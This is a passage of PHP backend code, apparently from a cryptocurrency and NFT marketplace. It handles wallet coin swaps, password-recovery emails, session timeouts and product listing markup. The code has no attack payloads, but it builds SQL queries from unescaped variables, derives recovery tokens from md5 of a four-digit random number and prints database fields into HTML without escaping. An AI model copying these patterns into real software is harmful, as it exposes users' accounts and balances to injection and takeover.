						$sql1 ="UPDATE wallet SET btc_bal='$qvalue', eth_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "LTC"){
					if($userdata['eth_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['ltc_bal'];
						$new_bal = $userdata['eth_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET ltc_bal='$qvalue', eth_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "DOGE"){
					if($userdata['eth_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['dog_bal'];
						$new_bal = $userdata['eth_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET dog_bal='$qvalue', eth_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				
			}
			if($base == "LTC"){
				if($quote == "BTC"){
					if($userdata['ltc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['btc_bal'];
						$new_bal = $userdata['ltc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET btc_bal='$qvalue', ltc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "ETH"){
					if($userdata['ltc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['eth_bal'];
						$new_bal = $userdata['ltc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET eth_bal='$qvalue', ltc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "DOGE"){
					if($userdata['ltc_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['dog_bal'];
						$new_bal = $userdata['ltc_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET dog_bal='$qvalue', ltc_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				
			}
			
			if($base == "DOGE"){
				if($quote == "ETH"){
					if($userdata['dog_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['eth_bal'];
						$new_bal = $userdata['dog_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET eth_bal='$qvalue', dog_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "LTC"){
					if($userdata['dog_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['ltc_bal'];
						$new_bal = $userdata['dog_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET ltc_bal='$qvalue', dog_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				if($quote == "BTC"){
					if($userdata['dog_bal'] >= $bvalue ){
						$qvalue = $qvalue + $userdata['btc_bal'];
						$new_bal = $userdata['dog_bal'] - $bvalue;
						$sql1 ="UPDATE wallet SET btc_bal='$qvalue', dog_bal='$new_bal' WHERE uid='$uid'";
						$result2 = mysqli_query($this->db,$sql1);
					}else{
						return false;
					}
				}
				
			}
			
			
		return "this";
		}else{
			return false;
		}
	}
	
	
	public function recover($email){
	                $sql = "SELECT * FROM users WHERE uemail='$email'";
					$result = mysqli_query($this->db,$sql) or die(mysqli_connect_errno()."Data cannot be inserted.");
					$user_data = mysqli_fetch_array($result);
					$uid = $user_data['uid'];
					$activationcode = "".md5(rand(1000,9999));
					$sql1 ="UPDATE users SET activationcode='$activationcode' WHERE uemail='$email'";
					$result = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
					if(!isset($result)){return false;}
				$subject = "Recover Your digitaleden Account"; 
				$extra="change_password.php?changes=".$activationcode."&id=".$id;
				$host  = $_SERVER['HTTP_HOST'];
				$uri  = rtrim(dirname($_SERVER['PHP_SELF']),'/\\');//http:$host$uri/$extra
				$body = "<!DOCTYPE html>
				<html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\">
				<head>
				  <meta charset=\"UTF-8\">
				  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
				  <meta name=\"x-apple-disable-message-reformatting\">
				  <title></title>
				  <!--[if mso]>
				  <noscript>
					<xml>
					  <o:OfficeDocumentSettings>
						<o:PixelsPerInch>96</o:PixelsPerInch>
					  </o:OfficeDocumentSettings>
					</xml>
				  </noscript>
				  <![endif]-->
				  <style>
					table, td, div, h1, p {font-family: Arial, sans-serif;}
				  </style>
				</head>
				<body style=\"margin:0;padding:0;\">
				  <table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;background:#ffffff;\">
					<tr>
					  <td align=\"center\" style=\"padding:0;\">
						<table role=\"presentation\" style=\"width:602px;border-collapse:collapse;border:1px solid #cccccc;border-spacing:0;text-align:left;\">
						  <tr>
							<td align=\"center\" style=\"padding:40px 0 30px 0;background:#70bbd9;\">
								<p><h1 style=\"font-size:24px;margin:0 0 20px 0;font-family:Arial,sans-serif;\">digitaleden</h1></p>
							</td>
						  </tr>
						  <tr>
							<td style=\"padding:36px 30px 42px 30px;\">
							  <table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;\">
								<tr>
								  <td style=\"padding:0 0 36px 0;color:#153643;\">
									<h1 style=\"font-size:24px;margin:0 0 20px 0;font-family:Arial,sans-serif;\">Recover your Account</h1>
									<p style=\"margin:0 0 12px 0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\">Click on the Button below to recover your account.</p>
									<p style=\"margin:0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\"><button style=\"background: #4285f4; padding: 20px; border: none; border-radius: 5px; cursor: pointer; \"><a href=\"$host$uri/$extra\" style=\"color:#FFF;text-decoration:none; font-size: 18px;\">Recover Account</a></button></p>
								  </td>
								</tr>
								<tr>
								  <td style=\"padding:0;\">
									<table role=\"presentation\" style=\"width:100%;border-collapse:collapse;border:0;border-spacing:0;\">
									  <tr>
										<td style=\"width:260px;padding:0;vertical-align:top;color:#153643;\">
											<p style=\"margin:0 0 12px 0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\">OR Copy and paste the link below into a browser to recover your account</p>
										  <p style=\"margin:0;font-size:16px;line-height:24px;font-family:Arial,sans-serif;\"><a href=\"$host$uri/$extra\" style=\"color:#1a73e8;text-decoration:underline;\">Copy Me to  recover your account</a></p>
										</td>
									  </tr>
									</table>
								  </td>
								</tr>
							  </table>
							</td>
						  </tr>
							  </table>
							</td>
						  </tr>
						</table>
					  </td>
					</tr>
				  </table>
				</body>
				</html>";
                    $fromName = 'digitaleden'; 
    				$from = "no-reply@digitaleden.com";
                    $headers = "From:" . $from; 
                    // Set content-type header for sending HTML email 
                    $headers = "MIME-Version: 1.0" . "\r\n"; 
                    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
                     
                    // Additional headers 
                    $headers .= 'From: '.$fromName.'<'.$from.'>' . "\r\n"; 
                    $headers .= 'Cc: no-reply@digitaleden.com' . "\r\n"; 
                    $headers .= 'Bcc: no-reply@digitaleden.com' . "\r\n"; 
 
					//$mailer = new mailer();
					//$mailer->mailsender($email, $subject, $body);
					$mailer = mail($email,$subject,$body, $headers);
		if($mailer){
                    
					$_SESSION['to'] = $email;
					$_SESSION['subject'] = $subject;
					$_SESSION['body'] = $body;
					$_SESSION['headers'] = $headers;
					$_SESSION['verify_forgot'] = $uid;
			return true;
		}else{
			return false;
		}
	}
	
	//inactivity
	public function autologout(){
		// inactive in seconds
		$inactive = 1800;
		if( !isset($_SESSION['timeout']) )
		$_SESSION['timeout'] = time() + $inactive; 

		$session_life = time() - $_SESSION['timeout'];

		if($session_life > $inactive)
		{  session_destroy(); header("Location:login.php");     }

		$_SESSION['timeout']=time();
	}
	//*** For showing the username or fullname 
	public function get_details($uid){
		$sql3 ="SELECT fullname FROM users WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql3);
		$userdata = mysqli_fetch_array($result);
		echo $user_data['fullname'];		
	}


	public function indexhome(){
		
		$sql3 ="SELECT * FROM collection ORDER BY RAND()  LIMIT 8";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['row1'] =array();
		while($userdata = mysqli_fetch_array($result)){
			$cid = $userdata['cid'];
			$cname = $userdata['ctitle'];
			$cpicture = $userdata['cpicture'];
			$row1 =" 
            <div class=\"col-xl-3 col-lg-3 col-md-4 col-sm-6\">
              <div class=\"card browse-cat\">
                <img
                  class=\"img-fluid card-img-top\"
                  src=\"img/marketplace/$cpicture\"
                  alt=\"\" style=\"height:250px; width:253px;\"
                />
                <div class=\"card-body\">
                  <h4>$cname</h4>
                </div>
              </div>
            </div>";


    	array_push($_SESSION['row1'],$row1);  

		}

		$sql3 ="SELECT * FROM items WHERE sell_status='Timer' ORDER BY id DESC LIMIT 7";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['row2'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$row2 = "";
			$cid = $userdata['cid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
        
        
                $seconds = strtotime($userdata['itime']) - time();

                $days = floor($seconds / 86400);
                $seconds %= 86400;

                $hours = floor($seconds / 3600);
                $seconds %= 3600;

                $minutes = floor($seconds / 60);
                $seconds %= 60;
                
                
                $str= "$days:$hours:$minutes:$seconds";
                
                $row2 =" <script>// Set the date we're counting down to 
                var countDownDate".$counter." = new Date(\"".$userdata['itime']."\").getTime();

		// Update the count down every 1 second
		var x".$counter." = setInterval(function() {

		  // Get today's date and time
		  var now".$counter." = new Date().getTime();

		  // Find the distance between now and the count down date
		  var distance".$counter." = countDownDate".$counter." - now".$counter.";

		  // Time calculations for days, hours, minutes and seconds
		  var days".$counter." = Math.floor(distance".$counter." / (1000 * 60 * 60 * 24));
		  var hours".$counter." = Math.floor((distance".$counter." % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
		  var minutes".$counter." = Math.floor((distance".$counter." % (1000 * 60 * 60)) / (1000 * 60));
		  var seconds".$counter." = Math.floor((distance".$counter." % (1000 * 60)) / 1000);

		  // Display the result in the element with id=\"demo\"
		  document.getElementById(\"basic_count".$counter."\").innerHTML =  days".$counter." +  \"d:\" +  hours".$counter." +  \"h:\" + minutes".$counter." +  \"m:\" +  seconds".$counter."  + \"s\";

		  // If the count down is finished, write some text
		  if (distance".$counter." < 0) {
		    clearInterval(x".$counter.");
		    document.getElementById(\"basic_count".$counter."\").innerHTML = \"EXPIRED\";
		  }
		}, 1000);
		</script>


		            <div class=\"g-challenge-card-mini clickable\">
		              <div class=\"challenge-info\">
		                <div class=\"g-status-wrapper column\">
		                  <div class=\"g-countdown xs red filled column\" id=\"basic_count".$counter."\">
		                    
		                  </div>
		                  
		                </div>
		                <div class=\"partner-wrap\">
		                  <img
		                    class=\"thumbnail\"
		                    src=\"img/marketplace/$cpicture\"
		                  />
		                  <div class=\"partner-name\">$cname</div>
		                </div>
		              </div>
		              <div class=\"g-challenge-reward-thumbnail\">
		                <img
		                  class=\"reward-thumb\"
		                  src=\"img/marketplace/$ipicture\"
		                />
		              </div>
		              <div class=\"challenge-title\">$iname</div>
		            </div>";


    	array_push($_SESSION['row2'],$row2);  
    	$counter++;
		}

		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY RAND()  LIMIT 4";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['row3'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$row3 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
                
                $row3 =" 
                <div class=\"col-xl-3 col-lg-6 col-md-6\">
              <div class=\"card items\">
                <div class=\"card-body\">
                  <div class=\"items-img position-relative\">
                    <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" alt=\"\"  style=\"height:213px; width:213px;\">
                    <a href=\"profile.html\" hidden><img src=\"images/avatar/4.jpg\" class=\"creator\" width=\"50\" alt=\"\"></a>
                  </div>
                  <a href=\"item.html?item=$iid\">
                    <h4 class=\"card-title\">$iname</h4>
                  </a>
                  <p></p>
                  <div class=\"d-flex justify-content-between\">
                    <div class=\"text-start\">
                      <p class=\"mb-2\"><span class=\"mb-2 text-uppercase\">$cname</span> <br>
                        Current Price: <strong class=\"text-primary\"> $crypto_price $crypto_symbol</strong></p>
                      <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                    </div>
                    <div class=\"text-end\">
                      <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                    </div>
                  </div>
                  <div class=\"d-flex justify-content-center mt-3\">
                    <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy</a>
                  </div>
                </div>
              </div>
            </div>";


    	array_push($_SESSION['row3'],$row3);  
    	$counter++;
		}


		$sql3 ="SELECT * FROM collection ORDER BY RAND()  LIMIT 12";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['row4'] =array();
		$counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$cid = $userdata['cid'];
			$cname = $userdata['ctitle'];
			$cpicture = $userdata['cpicture'];
			$sql31 ="SELECT * FROM items WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql31);
				$collection_price =0;
			while($userdata1 = mysqli_fetch_array($result1)){
				$collection_price += $userdata1['iprice'];

			}

        	$collection_price = round($collection_price/(coinvalue('ETH',1)) ,2);
			$row4 =" 
            <div class=\"col-xl-4 col-lg-6 col-md-6\">
              <a class=\"top-collection-content d-block\" href=\"view_collection.html?col=$cid\">
                <div class=\"d-flex align-items-center\">
                  <span class=\"serial\">3
                    <!-- -->.
                  </span>
                  <div class=\"flex-shrink-0\">
                    <span class=\"top-img\"><img class=\"img-fluid\" src=\"img/marketplace/$cpicture\" alt=\"\" width=\"70\"></span>
                  </div>
                  <div class=\"flex-grow-1 ms-3\">
                    <h5>$cname</h5>
                    <p class=\"text-muted\">
                      <img src=\"images/svg/eth.svg\" alt=\"\" width=\"10\" class=\"me-2\">$collection_price
                    </p>
                  </div>
                  <h5 class=\"text-warning\">
                    
                    <!-- --><b>$counter</b>
                  </h5>
                </div>
              </a>
            </div>";


    	array_push($_SESSION['row4'],$row4);  
		$counter +=1;

		}


		$sql3 ="SELECT * FROM collection ORDER BY RAND()  LIMIT 4";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['row5'] =array();
		while($userdata = mysqli_fetch_array($result)){
			$cid = $userdata['cid'];
			$cname = $userdata['ctitle'];
			$cpicture = $userdata['cpicture'];
			$cabout = $userdata['about'];
			$row5 =" 
            <div class=\"col-xl-3 col-lg-6 col-md-6\">
              <div class=\"card\">
                <img class=\"img-fluid card-img-top\" src=\"img/marketplace/$cpicture\" style=\"height:253px;width:253px;\">
                <div class=\"card-body\">
                  <div class=\"notable-drops-content-img\"></div>
                  <h4 class=\"card-title\">$cname</h4>
                  <p>$cabout</p>
                  <a href=\"explore.html\">Explore<i class=\"bi bi-arrow-right-short\"></i></a>
                </div>
              </div>
            </div>";


    	array_push($_SESSION['row5'],$row5);  

		}


		//collection.html

		$sql3 ="SELECT * FROM collection ORDER BY RAND()";
		$result = mysqli_query($this->db,$sql3);
			$_SESSION['collectioni'] =array();
		while($userdata = mysqli_fetch_array($result)){
			$collectioni = "";
			$cid = $userdata['cid'];
			$cname = $userdata['ctitle'];
			$cpicture = $userdata['cpicture'];
			$cauthor = $userdata['author'];
        
        
                
                $collectioni =" 
                  <div class=\" col-xl-6 col-lg-6 col-md-12 col-sm-12\">
                    <div class=\"card items\">
                      <div class=\"card-body\">
                        <div class=\"items-img position-relative\">
                          <img src=\"img/marketplace/$cpicture\" class=\"img-fluid rounded mb-3\" alt=\"\"  style=\"height:498px; width:600px;\"><img src=\"images/avatar/18.html\" class=\"creator\" width=\"50\" alt=\"\" hidden>
                        </div>
                        <a href=\"item.html\">
                          <h4 class=\"card-title\">$cname</h4>
                        </a>
                        <div class=\"d-flex justify-content-between\">
                          <div class=\"text-start\">
                            <p class=\"mb-2\">Author: $cauthor<span class=\"text-uppercase\"></span></p>
                            <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                          </div>
                          <div class=\"text-end\">
                            <p class=\"mb-2\" hidden>
                              Bid :
                              <strong class=\"text-primary\">0.15 ETH</strong>
                            </p>
                            <h5 class=\"text-muted\" hidden>0.15 ETH</h5>
                          </div>
                        </div>
                        <div class=\"d-flex justify-content-center mt-3\">
                          <a href=\"view_collection.html?col=$cid\" class=\"btn btn-primary\">View Collection</a>
                        </div>
                      </div>
                    </div>
                  </div>";


    	array_push($_SESSION['collectioni'],$collectioni);  
    	$counter++;
		}


		//explore Default
		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY RAND() LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['explore1'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$explore1 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $explore1 =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"height:212px; width:212px;\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$crypto_price ETH</strong> / 
                            <strong class=\"text-primary\">$crypto_price SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['explore1'],$explore1);  
    	$counter++;
		}


		//explore Recently Listed
		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY id DESC LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['explore11'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$explore11 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $explore11 =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"height:212px; width:212px;\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$crypto_price ETH</strong> / 
                            <strong class=\"text-primary\">$crypto_price SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['explore11'],$explore11);  
    	$counter++;
		}


		//explore Low to High Listed
		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY iprice ASC LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['explore12'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$explore12 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $explore12 =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"height:212px; width:212px;\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$crypto_price ETH</strong> / 
                            <strong class=\"text-primary\">$crypto_price SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['explore12'],$explore12);  
    	$counter++;
		}


		//explore High to Low Listed
		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY iprice DESC LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['explore13'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$explore13 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $explore13 =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"height:212px; width:212px;\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$crypto_price ETH</strong> / 
                            <strong class=\"text-primary\">$crypto_price SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['explore13'],$explore13);  
    	$counter++;
		}


		//market place Alphabetically items

		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY iname ASC LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['explore14'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$explore14 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $explore14 =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"height:212px; width:212px;\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$crypto_price ETH</strong> / 
                            <strong class=\"text-primary\">$crypto_price SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['explore14'],$explore14);  
    	$counter++;
		}


		//market place High - Low items

		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY iname ASC LIMIT 90";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['atoz'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$atoz = "";
			$cid = $userdata['cid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        
        
                
                $atoz =" 
                  <div class=\"g-nft-item\">
                    <div class=\"nft-wrap clickable anim-thumb\">
                      <div class=\"thumb-wrap-blur-bg l\">
                        <div
                          class=\"thumb-blur l\"
                          style=\"
                            background-image: url('img/marketplace/$ipicture');
                          \"
                        ></div>
                        <div class=\"thumb-overlay l\"></div>
                        <div
                          class=\"thumb l\"
                          style=\"
                            background-image: url('img/marketplace/$ipicture');
                          \"
                        ></div>
                      </div>
                      <div class=\"g-nft-type-icons-wrapper\"></div>
                      <div class=\"nft-info\">
                        <div class=\"info-header\">
                          <div class=\"item-name\">$iname</div>
                          <div class=\"item-description\">
                            <span class=\"item-creator\">$cname</span
                            >
                          </div>
                        </div>
                        <div class=\"info-footer\">
                          <div class=\"nft-price\">
                            <span class=\"label\">Lowest</span>
                            <div class=\"g-price m usd\">
                              <span class=\"price-amount\"
                                ><strong class=\"price-value\">
                                  $crypto_symbol $iprice</strong
                                ></span
                              >
                            </div>
                          </div>
                          <div class=\"nft-editions\" hidden>
                            <span class=\"label\">Available</span
                            ><span class=\"edition-value\">12/58</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>";


    	array_push($_SESSION['atoz'],$atoz);  
    	$counter++;
		}

		//drops unminted items
